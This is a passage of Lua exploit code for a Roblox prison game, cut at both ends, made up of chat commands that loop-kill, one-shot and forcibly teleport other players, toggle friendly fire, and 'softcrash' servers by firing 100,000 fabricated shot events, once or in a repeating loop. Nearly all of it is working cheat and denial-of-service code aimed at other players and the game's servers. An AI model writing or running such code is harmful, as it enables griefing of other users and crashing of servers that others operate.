            Notify("Success", "Disabled team killaura for all teams.", 2);
        elseif Args[2] == "inmates" or Args[2] == "inmate" or Args[2] == "i" then
            States.tkaInmates = false
            Notify("Success", "Disabled team killaura for: Inmates.", 2);
        elseif Args[2] == "guards" or Args[2] == "guard" or Args[2] == "g" then
            States.tkaGuards = false
            Notify("Success", "Disabled team killaura for: Guards.", 2);
        elseif Args[2] == "criminals" or Args[2] == "criminal" or Args[2] == "c" then
            States.tkaCriminals = false
            Notify("Success", "Disabled team killaura for: Criminals.", 2);
        else
            Notify("Error", "Not a valid team.", 2);
        end
    end;
    if CMD("getlt") or CMD("getlooptase") then
        pprint("====== LOOP TASING ======")
        for i,v in pairs(LoopTasing) do
            pprint(v.Name .. " (" .. v.DisplayName .. ")");
        end;
        pprint("====== END ======");
        Notify("Success", "Type /console or F9 to see loop tasing.", 2);
    end;
    if CMD("getmlk") or CMD("getmeleeloopkill") then
        pprint("====== LOOP MELEE KILLING ======")
        if States.MeleeAll then
        pprint("Meleekill_All: true")
        else
        pprint("Meleekill_All: false")
        end
        if States.MeleeInmates then
        pprint("Meleekill_Inmates: true")
        else
        pprint("Meleekill_Inmates: false")
        end
        if States.MeleeCriminals then
        pprint("Meleekill_Criminals: true")
        else
        pprint("Meleekill_Criminals: false")
        end
        if States.MeleeGuards then
        pprint("Meleekill_Guards: true")
        else
        pprint("Meleekill_Guards: false")
        end
        pprint("--- PLAYERS ---")
        for i,v in pairs(MeleeKilling) do
            pprint(v.Name .. " (" .. v.DisplayName .. ")");
        end;
        pprint("====== END ======");
        pprint("====== LOOP TELEPORT KILLING ======")
        if States.TeleKillAll then
        pprint("Telekill_all: true")
        else
        pprint("Telekill_all: false")
        end
        if States.TeleKillInmates then
        pprint("Telekill_Inmates: true")
        else
        pprint("Telekill_Inmates: false")
        end
        if States.TeleKillGuards then
        pprint("Telekill_Guards: true")
        else
        pprint("Telekill_Guards: false")
        end
        if States.TeleKillCriminals then
        pprint("Telekill_Criminals: true")
        else
        pprint("Telekill_Criminals: false")
        end
        pprint("--- PLAYERS ---")
        for i,v in pairs(TeleportKilling) do
            pprint(v.Name .. " (" .. v.DisplayName .. ")");
        end
        pprint("====== END =======")
        Notify("Success", "Type /console or F9 to see loop melee killing.", 2);
    end;
    if CMD("mlk") or CMD("meleeloopkill") or CMD("meleelk") then
        if Args[2] == "all" then
            States.MeleeAll = true;
            Notify("Success", "Melee loop-killing all.", 2);
        elseif Args[2] == "inmates" or Args[2] == "inmate" or Args[2] == "i" then
            States.MeleeInmates = true
            Notify("Success", "Melee loop-killing Inmates.", 2);
        elseif Args[2] == "guards" or Args[2] == "guard" or Args[2] == "g" then
            States.MeleeGuards = true
            Notify("Success", "Melee loop-killing Guards.", 2);
        elseif Args[2] == "criminals" or Args[2] == "criminal" or Args[2] == "c" then
            States.MeleeCriminals = true
            Notify("Success", "Melee loop-killing Criminals.", 2);
        else
            local Player = GetPlayer(Args[2], LocalPlayer);
            if Player then
                MeleeKilling[Player.UserId] = Player;
                Notify("Success", "Melee loop-killing " .. Player.Name .. ".")
            else
                Notify("Error", Args[2] .. " is not a valid player.", 2);
            end;
        end;
    end;
    if CMD("tlk") or CMD("teleportloopkill") or CMD("telelk") then
        if Args[2] == "all" then
            States.TeleKillAll = true;
            Notify("Success", "Teleport loop-killing all.", 2);
        elseif Args[2] == "inmates" or Args[2] == "inmate" or Args[2] == "i" then
            States.TeleKillInmates = true
            Notify("Success", "Teleport loop-killing Inmates.", 2);
        elseif Args[2] == "guards" or Args[2] == "guard" or Args[2] == "g" then
            States.TeleKillGuards = true
            Notify("Success", "Teleport loop-killing Guards.", 2);
        elseif Args[2] == "criminals" or Args[2] == "criminal" or Args[2] == "c" then
            States.TeleKillCriminals = true
            Notify("Success", "Teleport loop-killing Criminals.", 2);
        else
            local Player = GetPlayer(Args[2], LocalPlayer);
            if Player then
                TeleportKilling[Player.UserId] = Player;
                Notify("Success", "Teleport loop-killing " .. Player.Name .. ".")
            else
                Notify("Error", Args[2] .. " is not a valid player.", 2);
            end;
        end;
    end;
    if CMD("unmlk") or CMD("unmeleeloopkill") or CMD("unmeleelk") then
        if Args[2] == "all" then
            States.MeleeAll = false;
            States.MeleeInmates = false;
            States.MeleeGuards = false;
            States.MeleeCriminals = false;
            MeleeKilling = {};
            Notify("Success", "Stopped melee loop-killing all.", 2);
        elseif Args[2] == "inmates" or Args[2] == "inmate" or Args[2] == "i" then
            States.MeleeInmates = false
            Notify("Success", "Stopped melee loop-killing Inmates.", 2);
        elseif Args[2] == "guards" or Args[2] == "guard" or Args[2] == "g" then
            States.MeleeGuards = false
            Notify("Success", "Stopped melee loop-killing Guards.", 2);
        elseif Args[2] == "criminals" or Args[2] == "criminal" or Args[2] == "c" then
            States.MeleeCriminals = false
            Notify("Success", "Stopped melee loop-killing Criminals.", 2);
        else
            local Player = GetPlayer(Args[2], LocalPlayer);
            if Player then
                MeleeKilling[Player.UserId] = nil;
                Notify("Success", "Stopped melee loop-killing " .. Player.Name .. ".")
            else
                Notify("Error", Args[2] .. " is not a valid player.", 2);
            end;
        end;
    end;
    if CMD("untlk") or CMD("unteleportloopkill") or CMD("untelelk") then
        if Args[2] == "all" then
            States.TeleKillAll = false;
            States.TeleKillInmates = false;
            States.TeleKillGuards = false;
            States.TeleKillCriminals = false;
            TeleportKilling = {};
            myarguments.breaktelekill = true
            Notify("Success", "Stopped Teleport loop-killing all.", 2);
        elseif Args[2] == "inmates" or Args[2] == "inmate" or Args[2] == "i" then
            States.TeleKillInmates = false
            Notify("Success", "Stopped teleport loop-killing Inmates.", 2);
        elseif Args[2] == "guards" or Args[2] == "guard" or Args[2] == "g" then
            States.TeleKillGuards = false
            Notify("Success", "Stopped teleport loop-killing Guards.", 2);
        elseif Args[2] == "criminals" or Args[2] == "criminal" or Args[2] == "c" then
            States.TeleKillCriminals = false
            Notify("Success", "Stopped teleport loop-killing Criminals.", 2);
        else
            local Player = GetPlayer(Args[2], LocalPlayer);
            if Player then
                TeleportKilling[Player.UserId] = nil;
                myarguments.breaktelekill = true
                Notify("Success", "Stopped Teleport loop-killing " .. Player.Name .. ".")
            else
                Notify("Error", Args[2] .. " is not a valid player.", 2);
            end;
        end;
    end;
    if CMD("slk") or CMD("speedloopkill") then
        if Args[2] == "all" then
            States.SpeedKillAll = true;
        elseif Args[2] == "guards" or Args[2] == "g" then
            States.SpeedKillGuards = true;
        elseif Args[2] == "inmates" or Args[2] == "i" then
            States.SpeedKillInmates = true;
        elseif Args[2] == "criminals" or Args[2] == "c" then
            States.SpeedKillCriminals = true;
        else
            local Player = GetPlayer(Args[2], LocalPlayer);
            if Player then
                SpeedKilling[Player.UserId] = Player;
                Notify("Success", "Speed loop-killing " .. Player.Name .. ".", 2)
            else
                Notify("Error", Args[2] .. " is not a valid player.", 2);
            end;
        end;
    end;
    if CMD("unslk") or CMD("unspeedloopkill") then
        if Args[2] == "all" then
            SpeedKilling = {};
            States.SpeedKillAll = false;
        elseif Args[2] == "guards" or Args[2] == "g" then
            States.SpeedKillGuards = false;
        elseif Args[2] == "inmates" or Args[2] == "i" then
            States.SpeedKillInmates = false;
        elseif Args[2] == "criminals" or Args[2] == "c" then
            States.SpeedKillCriminals = false;
        else
            local Player = GetPlayer(Args[2], LocalPlayer);
            if Player then
                SpeedKilling[Player.UserId] = nil;
                Notify("Success", "Stopped speed loop-killing " .. Player.Name .. ".", 2)
            else
                Notify("Error", Args[2] .. " is not a valid player.", 2);
            end;
        end;
    end;
    if CMD("god") then
        SavePos();
        States.GodMode = false;
        Notify("Error", " Failed, Humanoid patched.", 2);
    end;
    if CMD("ungod") then
        States.GodMode = false;
        Notify("Success", "Godmode is already disabled.", 2);
    end;
    if CMD("clogs") or CMD("combatlogs") then
        if not States.AntiCrash then
            States.CombatLogs = not States.CombatLogs;
            Notify("Success", "Toggled combat logs to " .. tostring(States.CombatLogs) .. ".", 2);
        else
            Notify("Error", "Disable anticrash first! (" .. Settings.Prefix .. "acrash / " .. Settings.Prefix .. "anticrash).", 2);
        end;
    end;
    if CMD("shootback") or CMD("sb") then
        if not States.AntiCrash then
            local Player = GetPlayer(Args[2], LocalPlayer);
            if Player then
                if Player == LocalPlayer then
                    States.ShootBack = not States.ShootBack;
                    ChangeGuiToggle(States.ShootBack, "Shoot Back");
                    Notify("Success", "Toggled shoot back to " .. tostring(States.ShootBack) .. ".", 2);
                else
                    if not AntiShoots[Player.UserId] then
                        AntiShoots[Player.UserId] = Player;
                        Notify("Success", "Gave shoot back to " .. Player.Name .. ". Type " .. Settings.Prefix .. "sb [plr] to disable.", 2);
                    else
                        AntiShoots[Player.UserId] = nil;
                        Notify("Success", "Removed shoot back from " .. Player.Name .. ".", 2);
                    end;
                end;
            else
                Notify("Error", Args[2] .. " is not a valid player.", 2);
            end;
        else
            Notify("Error", "Disable anticrash first! (" .. Settings.Prefix .. "acrash / " .. Settings.Prefix .. "anticrash).", 2);
        end;
    end;
    if CMD("tb") or CMD("taseback") then
        if not States.AntiCrash then
            local Player = GetPlayer(Args[2], LocalPlayer);
            if Player then
                if Player == LocalPlayer then
                    States.TaseBack = not States.TaseBack;
                    ChangeGuiToggle(States.TaseBack, "Tase Back");
                    Notify("Success", "Toggled tase back to " .. tostring(States.TaseBack) .. ". Type " .. Settings.Prefix .. "tb [plr] to disable.", 2);
                else
                    if not TaseBacks[Player.UserId] then
                        TaseBacks[Player.UserId] = Player;
                        Notify("Success", "Gave tase back to " .. Player.Name .. ".", 2);
                    else
                        TaseBacks[Player.UserId] = nil;
                        Notify("Success", "Removed tase back from " .. Player.Name .. ".", 2);
                    end;
                end;
            else
                Notify("Error", Args[2] .. " is not a valid player.", 2);
            end;
        else
            Notify("Error", "Disable anticrash first! (" .. Settings.Prefix .. "acrash / " .. Settings.Prefix .. "anticrash).", 2);
        end;
    end;
    if CMD("clsb") or CMD("clearshootback") then
        AntiShoots = {};
        Notify("Success", "Cleared shoot backs.", 2);
    end;
    if CMD("cltb") or CMD("cleartaseback") then
        TaseBacks = {};
        Notify("Success", "Cleared tase backs.", 2);
    end;
    if CMD("clop") then
        Onepunch = {};
        Notify("Success", "Cleared one punch.", 2);
    end;
    if CMD("clos") or CMD("clearoneshot") then
        Oneshots = {};
        Notify("Success", "Cleared one shot.", 2);
    end;
    if CMD("getstates") or CMD("gets") then
        pprint("====== STATES ======")
        for i,v in next, States do
            pprint(i, v)
        end;
        pprint("====== END ======")
        Notify("Success", "Type /console or press F9 to see states.", 2);
    end;
    if CMD("ffire") or CMD("friendlyfire") then
        States.FriendlyFire = not States.FriendlyFire;
        Info.FriendlyFireOldTeam = LocalPlayer.TeamColor.Name
        Notify("Success", "Toggled friendly fire to " .. tostring(States.FriendlyFire) .. ".", 2);
    end;
    if CMD("acrash") or CMD("anticrash") then
        States.AntiCrash = not States.AntiCrash;
        ChangeGuiToggle(States.AntiCrash, "Anti-Crash");
        Notify("Success", "Toggled anti crash to " .. tostring(States.AntiCrash) .. ".", 2);
        if States.AntiCrash then
            States.ShootBack = false
            States.TaseBack = false;
            ChangeGuiToggle(false, "Shoot Back");
            ChangeGuiToggle(false, "Tase Back");
            for i,v in pairs(getconnections(rStorage.ReplicateEvent.OnClientEvent)) do
                v:Disable();
            end;
        else
            for i,v in pairs(getconnections(rStorage.ReplicateEvent.OnClientEvent)) do
                v:Enable();
            end;
        end;
    end;
    if CMD("getd") or CMD("getdef") then
        pprint("====== DEFENSES ======")
        pprint("AntiShoot", States.ShootBack);
        pprint("AntiBring", States.AntiBring);
        pprint("AntiFling", States.AntiFling);
        pprint("AntiPunch", States.AntiPunch);
        pprint("AntiCrash", States.AntiCrash);
        pprint("AntiCriminal", States.AntiCriminal);
        pprint("====== END ======")
    end;
    if CMD("nuke") or CMD("kamikaze") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Nukes[Player.UserId] = Player;
            Chat("!!! " .. Player.DisplayName .. " has turned into a nuke - if they die everyone dies !!!");
            Notify("Success", "Turned " .. Player.Name .. " into a nuke.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("chaosmode") or CMD("chaos") then
        if not States.Chaosmode then
        States.Chaosmode = true
        Notify("Success", "Chaosmode activated.", 2);
        Chat("!!! Chaosmode has been activated! if anyone dies, EVERYONE DIES !!!")
        else
        Notify("Error", "Chaosmode is already activated, type .unchaosmode or .unchaos to disable", 2);
        end
    end;
    if CMD("unchaosmode") or CMD("unchaos") then
        States.Chaosmode = false
        Notify("Success", "Stopped the chaos", 2);
    end;
    if CMD("crashnuke") or CMD("cnuke") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            SuperNukes[Player.UserId] = Player;
            Chat("!!! " .. Player.DisplayName .. " has turned into a CrashNuke - if they die, THE SERVER WILL BE CRASHED!!!");
            Notify("Success", "Turned " .. Player.Name .. " into a CrashNuke.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("uncrashnuke") or CMD("uncnuke") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            SuperNukes[Player.UserId] = nil;
            Notify("Success", "Removed SuperNuke from " .. Player.Name .. ".", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;  
    if CMD("defuse") or CMD("unnuke") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Nukes[Player.UserId] = nil;
            Notify("Success", "Removed nuke from " .. Player.Name .. ".", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("btools") then
        local tool1 = Instance.new("HopperBin", LocalPlayer.Backpack)
        local tool2 = Instance.new("HopperBin", LocalPlayer.Backpack)
        local tool3 = Instance.new("HopperBin", LocalPlayer.Backpack)
        local tool4 = Instance.new("HopperBin", LocalPlayer.Backpack)
        local tool5 = Instance.new("HopperBin", LocalPlayer.Backpack)
        tool1.BinType = "Clone"
        tool2.BinType = "GameTool"
        tool3.BinType = "Hammer"
        tool4.BinType = "Script"
        tool5.BinType = "Grab"
        Notify("Success", "Obtained btools", 2);
    end;
    if CMD("gui") or CMD("guis") then
        ToggleGuis();
    end;
    if CMD("bindgui") or CMD("guikeybind") then
        local Bind = Args[2]
        if Bind then
            if CheckKeycode(Bind) then
                Settings.ToggleGui = Bind;
                Notify("Success", "Changed GUI bind to " .. Bind .. ".", 2);
            else
                Notify("Error", "That is not a valid keybind. If it is a letter make sure its capitalised.")
            end;
        else
            Notify("Error", "Specify a keybind.", 2);
        end;
    end;
    if CMD("noclip") then
        States.NoClip = true;
        Notify("Success", "Enabled no-clip. Use " .. Settings.Prefix .. "clip to disable.", 2);
    end;
    if CMD("clip") then
        States.NoClip = false;
        Notify("Success", "Disabled no-clip.", 2);
    end;
    if CMD("Placeholder_ff") or CMD("Placeholder_forcefield") then
        States.Forcefield = true;
        SavePos();
        Notify("Success", "Enabled force field", 2);
    end;
    if CMD("Placeholder_unff") or CMD("Placeholder_unforcefield") then
        States.Forcefield = false;
        Notify("Success", "Disabled force field", 2);
    end;
    if CMD("pa") or CMD("punchaura") then
        States.PunchAura = not States.PunchAura;
        Notify("Success", "Toggled punch aura to " .. tostring(States.PunchAura) .. ".", 2);
    end;
    if CMD("sp") or CMD("spampunch") then
        States.SpamPunch = not States.SpamPunch
        Notify("Success", "Toggled spam punch to " .. tostring(States.SpamPunch) .. ".", 2);
    end;
    if CMD("op") or CMD("onepunch") then
        local Player = GetPlayer(Args[2], LocalPlayer);

        if Player then
            if Player == LocalPlayer then
                States.OnePunch = not States.OnePunch
                Notify("Success", "Toggled one punch to " .. tostring(States.OnePunch) .. ".", 2);
            else
                if not Onepunch[Player.UserId] then
                    Onepunch[Player.UserId] = Player
                    Notify("Success", "Added one punch to " .. Player.Name .. ". Type " .. Settings.Prefix .. "op [plr] to disable.", 2);
                else
                    Onepunch[Player.UserId] = nil;
                    Notify("Success", "Removed one punch from " .. Player.Name .. ".", 2);
                end;
            end;
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("os") or CMD("oneshot") then
        local Player = GetPlayer(Args[2], LocalPlayer);

        if Player then
            if Player == LocalPlayer then
                States.OneShot = not States.OneShot;
                Notify("Success", "Toggled one shot to " .. tostring(States.OneShot) .. ".", 2);
            else
                if not States.AntiCrash then
                    if not Oneshots[Player.UserId] then
                        Oneshots[Player.UserId] = Player
                        Notify("Success", "Added one shot to " .. Player.Name .. ". Type " .. Settings.Prefix .. "os [plr] to disable.", 2);
                    else
                        Oneshots[Player.UserId] = nil;
                        Notify("Success", "Removed one shot from " .. Player.Name .. ".", 2);
                    end;
                else
                    Notify("Error", "Disable anticrash first! (" .. Settings.Prefix .. "acrash / " .. Settings.Prefix .. "anticrash).", 2);
                end;
            end;
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("ctp") or CMD("clicktp") then
        local Player = GetPlayer(Args[2], LocalPlayer);

        if Player then
            if Player == LocalPlayer then
                States.ClickTeleport = not States.ClickTeleport;
                Notify("Success", "Toggled click tp to " .. tostring(States.ClickTeleport) .. ". (CTRL)", 2);
            else
                if not States.AntiCrash then
                    if not ClickTeleports[Player.UserId] then
                        ClickTeleports[Player.UserId] = Player
                        Notify("Success", "Added click tp to " .. Player.Name .. ". Type " .. Settings.Prefix .. "ctp [plr] to disable.", 2);
                    else
                        ClickTeleports[Player.UserId] = nil;
                        Notify("Success", "Removed click tp from " .. Player.Name .. ".", 2);
                    end;
                else
                    Notify("Error", "Disable anticrash first! (" .. Settings.Prefix .. "acrash / " .. Settings.Prefix .. "anticrash).", 2);
                end;
            end;
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("clctp") then
        ClickTeleports = {};
        Notify("Success", "Cleared click teleports.", 2);
    end;
    if CMD("hop") or CMD("svhop") or CMD("serverhop") then
        local FoundServers = {};
        for i,v in pairs(HttpService:JSONDecode(game:HttpGetAsync("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")).data) do
            if type(v) == "table" and v.playing < v.maxPlayers and v.id ~= game.JobId then
                FoundServers[#FoundServers+1] = v.id;
            end;
        end;

        if #FoundServers > 0 then
            Notify("Success", "Server hopping...", 2);
            TeleportService:TeleportToPlaceInstance(game.PlaceId, FoundServers[math.random(1, #FoundServers)]);
        else
            Notify("Error", "Couldn't find a server to join.", 2);
        end;
    end;
    if CMD("copyteam") or CMD("ct") then
        if not States.CopyingTeam then
            local Player = GetPlayer(Args[2], LocalPlayer);
            if Player and Player ~= LocalPlayer then
                States.CopyingTeam = {Player = Player};
                States.CopyingTeam.Connection = Player:GetPropertyChangedSignal("TeamColor"):Connect(function()
                    if not next(Loopkilling) or not next(SpeedKilling) or not next(LoopTasing) then
                        local NewTeam = Player.TeamColor.Name
                        SavePos();
                        if NewTeam == "Bright orange" or NewTeam == "Medium stone grey" then
                            TeamEvent(NewTeam);
                        else
                            if NewTeam == "Bright blue" then
                                if #Teams.Guards:GetPlayers() >= 8 then
                                    Loadchar(NewTeam)
                                else
                                    TeamEvent(NewTeam);
                                end;
                            else
                                Loadchar(NewTeam);
                            end;
                        end;
                        LoadPos();
                    end;
                end);
                if Player.TeamColor ~= LocalPlayer.TeamColor then
                    SavePos();
                    Loadchar(Player.TeamColor.Name);
                    LoadPos();
                end;
                Notify("Success", "Copying team of " .. Player.Name .. ". Type " .. Settings.Prefix .. "ct [plr] to disable.", 2);
            else
                Notify("Error", Args[2] .. " is not a valid player.", 2);
            end;
        else
            Notify("Success", "Disabled copy team.", 2);
            States.CopyingTeam.Connection:Disconnect();
            States.CopyingTeam = nil;
        end;
    end;
    if CMD("gs") or CMD("gunspin") then
        task.spawn(function()
            States.SpinningGuns = true;
            local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:wait()
            if Character then
                GiveGuns();
                local speed = 10
                local radius = 10
                local finish;

                if Args[2] and tonumber(Args[2]) then
                    radius = tonumber(Args[2])
                end
                if Args[3] and tonumber(Args[3]) then
                    speed = tonumber(Args[3])
                end
                local spinguns = {
                    ["AK-47"] = CFrame.new(-radius, 0, 0);
                    ["Remington 870"] = CFrame.new(radius, 0, 0);
                }

                for i,v in pairs(LocalPlayer.Backpack:GetChildren()) do
                    if spinguns[v.Name] then
                        v.Grip = spinguns[v.Name]
                        v.Parent = Character
                    end
                end

                task.spawn(function()
                    LocalPlayer.CharacterAdded:wait()
                    finish = true
                end);
                
                task.wait(0.1);
                
                repeat
                    for i,v in pairs(Character:GetChildren()) do
                        if spinguns[v.Name] then
                            v.Grip = v.Grip * CFrame.Angles(0,math.rad(speed), 0);
                            v.Parent = LocalPlayer.Backpack;
                            v.Parent = Character;
                        end;
                    end;
                    game:GetService("RunService").RenderStepped:wait();
                until finish == true;
            end;
        end);
        Notify("Success", "Spinning guns (respawn / reset to disable)", 2);
    end;
    if CMD("sc") or CMD("softcrash") then
        local originalPosition = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
        local hasAK47g = LocalPlayer.Backpack:FindFirstChild("AK-47") or LocalPlayer.Character:FindFirstChild("AK-47")
        if not hasAK47g then
        task.spawn(function()
            Workspace.Remote.ItemHandler:InvokeServer({Position = LocalPlayer.Character.Head.Position, Parent = workspace.Prison_ITEMS.giver:FindFirstChild("AK-47") or workspace.Prison_ITEMS.single:FindFirstChild("AK-47")})
        end)
        end
        local Events = {};
        for i = 1, 100000 do
            local origin, destination = LocalPlayer.Character.HumanoidRootPart.Position, workspace:FindFirstChildOfClass("Part").Position;
            local distance, ray = (origin-destination).Magnitude, Ray.new(origin, (destination-origin).unit*9e9)
            local cf = CFrame.new(destination, origin) * CFrame.new(0, 0, -distance / 2);
            Events[#Events+1] = {
                Hit = v,
                Cframe = cf,
                Distance = distance,
                RayObject = Ray.new(Vector3.new(), Vector3.new())
            }
        end;
        ItemHandler(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP);
        local Gun = LocalPlayer.Character:FindFirstChild("AK-47") or LocalPlayer.Backpack:FindFirstChild("AK-47")
        rStorage.ShootEvent:FireServer(Events, Gun)
        rStorage.ReloadEvent:FireServer(Gun);
        Notify("Success", "Soft-crashed server.", 2);
    end;
    if CMD("sc2") or CMD("softcrash2") then
        if LocalPlayer.TeamColor ~= BrickColor.new("Bright blue") then
             if #game:GetService("Teams").Guards:GetPlayers() < 8 then
		  Workspace.Remote.TeamEvent:FireServer("Bright blue")
	     end
        end
        local hasM9 = LocalPlayer.Backpack:FindFirstChild("M9") or LocalPlayer.Character:FindFirstChild("M9")
        if not hasM9 then
        task.spawn(function()
        Workspace.Remote.ItemHandler:InvokeServer({Position = LocalPlayer.Character.Head.Position, Parent = workspace.Prison_ITEMS.giver:FindFirstChild("M9") or workspace.Prison_ITEMS.single:FindFirstChild("M9")})
        end)
        end
        local Events = {};
        for i = 1, 100000 do
            local origin, destination = LocalPlayer.Character.HumanoidRootPart.Position, workspace:FindFirstChildOfClass("Part").Position;
            local distance, ray = (origin-destination).Magnitude, Ray.new(origin, (destination-origin).unit*9e9)
            local cf = CFrame.new(destination, origin) * CFrame.new(0, 0, -distance / 2);
            Events[#Events+1] = {
                Hit = v,
                Cframe = cf,
                Distance = distance,
                RayObject = Ray.new(Vector3.new(), Vector3.new())
            }
        end;
        ItemHandler(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP);
        local Gun = LocalPlayer.Character:FindFirstChild("M9") or LocalPlayer.Backpack:FindFirstChild("M9")
        rStorage.ShootEvent:FireServer(Events, Gun)
        rStorage.ReloadEvent:FireServer(Gun);
        Notify("Success", "Soft-crashed server.", 2);
    end;
    if CMD("loopsoftcrash") or CMD("lsoftcrash") or CMD("loopcrash") or CMD("lsc") then
        States.Softcrashing = true
        task.spawn(function()
        while States.Softcrashing do task.wait(1.4)
        pcall(function()
        local math = math.random(1, 2)
        if math == 1 then
        print("Debug_math.random is 1 or M9")
        local hasM9 = LocalPlayer.Backpack:FindFirstChild("M9") or LocalPlayer.Character:FindFirstChild("M9")
        if not hasM9 then
        task.spawn(function()
        Workspace.Remote.ItemHandler:InvokeServer({Position = LocalPlayer.Character.Head.Position, Parent = workspace.Prison_ITEMS.giver:FindFirstChild("M9") or workspace.Prison_ITEMS.single:FindFirstChild("M9")})
        end)
        end
        local Events = {};
        for i = 1, 100000 do
            local origin, destination = LocalPlayer.Character.HumanoidRootPart.Position, workspace:FindFirstChildOfClass("Part").Position;
            local distance, ray = (origin-destination).Magnitude, Ray.new(origin, (destination-origin).unit*9e9)
            local cf = CFrame.new(destination, origin) * CFrame.new(0, 0, -distance / 2);
            Events[#Events+1] = {
                Hit = v,
                Cframe = cf,
                Distance = distance,
                RayObject = Ray.new(Vector3.new(), Vector3.new())
            }
        end;
        ItemHandler(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP);
        local Gun = LocalPlayer.Character:FindFirstChild("M9") or LocalPlayer.Backpack:FindFirstChild("M9")
        rStorage.ShootEvent:FireServer(Events, Gun)
        rStorage.ReloadEvent:FireServer(Gun);
        elseif math == 2 then
        print("Debug_math.random is 2 or AK-47")
        local hasAK = LocalPlayer.Backpack:FindFirstChild("AK-47") or LocalPlayer.Character:FindFirstChild("AK-47")
        if not hasAK then
        task.spawn(function()
        Workspace.Remote.ItemHandler:InvokeServer({Position = LocalPlayer.Character.Head.Position, Parent = workspace.Prison_ITEMS.giver:FindFirstChild("AK-47") or workspace.Prison_ITEMS.single:FindFirstChild("AK-47")})
        end)
        end
        local Events = {};
        for i = 1, 100000 do
            local origin, destination = LocalPlayer.Character.HumanoidRootPart.Position, workspace:FindFirstChildOfClass("Part").Position;
            local distance, ray = (origin-destination).Magnitude, Ray.new(origin, (destination-origin).unit*9e9)
            local cf = CFrame.new(destination, origin) * CFrame.new(0, 0, -distance / 2);
            Events[#Events+1] = {
                Hit = v,
                Cframe = cf,
                Distance = distance,
                RayObject = Ray.new(Vector3.new(), Vector3.new())
            }
        end;
        ItemHandler(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP);
        local Gun = LocalPlayer.Character:FindFirstChild("AK-47") or LocalPlayer.Backpack:FindFirstChild("AK-47")
        rStorage.ShootEvent:FireServer(Events, Gun)
        rStorage.ReloadEvent:FireServer(Gun);
        end
        end)
        end
        end)
        --repeat task.wait() until myarguments.isalreadyfired
--local RunService = game:GetService("RunService") --Placeholder, tried to include the team event crash, but it didnt work.
--RunService.Heartbeat:Connect(function()
---for i = 1, 40 do
--workspace.Remote.TeamEvent:FireServer("Bright blue")
--end
    ---end)
       Notify("Success", "Loop-softcrashing", 2);
    end;
    if CMD("unloopsoftcrash") or CMD("unloopcrash") then
        States.Softcrashing = false
        Notify("Success", "Stopped loop-softcrashing.", 2);
    end;
    if CMD("lb") or CMD("loopbring") then
        if Args[2] == "all" then
            Notify("Success", "Loop-bringing all.", 2);
            pcall(LoopTeleport, LocalPlayer, LocalPlayer.Character.Head.CFrame, true);
        else
            local Player = GetPlayer(Args[2], LocalPlayer);
            if Player then
                Notify("Success", "Loop-bringing " .. Player.Name .. ".", 2);
                pcall(function()
                    LoopTeleport(Player, LocalPlayer.Character.Head.CFrame);
                end);
            else
                Notify("Error", Args[2] .. " is not a valid player.", 2);
            end;
        end;
    end;
    if CMD("unlb") then
        States.Loopbring = false;
        Notify("Success", "Stopped loop bringing.", 2);
    end;
    if CMD("cltr") then
        Trapped = {};
        Notify("Success", "Untrapped all", 2);
    end;
    if CMD("lpunch") or CMD("loudpunch") then
        States.LoudPunch = not States.LoudPunch
        Notify("Success", "Toggled loud punch to " .. tostring(States.LoudPunch) .. ".", 2);
    end;
    if CMD("sarmor") or CMD("spamarmor") then
        if CheckOwnedGamepass() then
            States.SpamArmor = true
            local Amount = Args[2] or 10
            local Num = tonumber(Args[2])
            if Num then
                Notify("Success", "Armor spamming.", 2);
                SavePos()
                Loadchar("Bright blue")
                LoadPos()
                task.spawn(ArmorSpam, Num)
            end;
        else
            Notify("Error", "You don't have the riot gamepass", 2);
        end;
    end;
    if CMD("unsarmor") or CMD("unspamarmor") then
        States.ArmorSpam = false;
        Notify("Success", "Stopped armor spamming.", 2);
    end;
	if CMD("kcf") then
		States.Kcf = true
		Notify("Success", "Kcf turned on.", 2);
	end 
	if CMD("unkcf") then
		States.Kcf = false
		Notify("Success", "Kcf turned off.", 2);
	end
	if CMD("shock") or CMD("fence") then
	    local Player = GetPlayer(Args[2], LocalPlayer)
        if Player then
            Teleport(Player, CFrame.new(698.88549804688, 118.66983032227, 2567.1765136719));
            Notify("Success", "shocked " .. Player.Name .. 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
	end
	if CMD("fridge") then
	    local Player = GetPlayer(Args[2], LocalPlayer)
        if Player then
            Teleport(Player, CFrame.new(787.4412841796875, 102.35999298095703, 2251.14453125));
            Notify("Success", "Teleported " .. Player.Name ..("to the fridge."), 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
	end
	if CMD("border") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(778.280029, 396.23996, 2674.35278, 0.998099327, 4.16638704e-06, -0.0616256408, 3.69708708e-08, 1, 6.82067985e-05, 0.0616256408, -6.80794183e-05, 0.998099327));
            Notify("Success", "Teleported " .. Player.Name .. " to Border.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("cbr") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(-920.1688842773438, 127.95339965820312, 2056.17919921875));
            Notify("Success", "Teleported " .. Player.Name .. " to criminal base roof.", 2);
        else
